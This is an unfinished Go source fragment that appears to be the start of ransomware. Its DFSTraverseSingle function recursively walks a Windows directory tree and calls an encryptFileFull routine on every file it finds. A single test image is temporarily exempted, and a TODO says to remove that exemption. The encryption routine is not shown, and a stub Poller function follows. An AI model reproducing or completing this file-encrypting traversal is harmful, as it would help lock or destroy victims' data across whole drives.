package main

import (
	"fmt"
	"io/ioutil"
	"log"
)

func DFSTraverseSingle(dirPath string) {
	files, err := ioutil.ReadDir(dirPath)
	if err != nil {
		log.Fatal(err)
	}

	for _, file := range files {
		fmt.Println(dirPath+"\\"+file.Name(), file.IsDir())
		if file.IsDir() {
			DFSTraverseSingle(dirPath + "\\" + file.Name())
		} else {
			if file.Name() != "squirrel_2.jpg" { // TODO: Remove this once done
				encryptFileFull(dirPath+"\\"+file.Name(), file)
			}
		}
	}
}

// TODO:

type Resource string

func Poller(in, out chan *Resource) {
	for r := range in {
		// poll the URL

		// send the processed Resource to out
		out <- r
	}
}
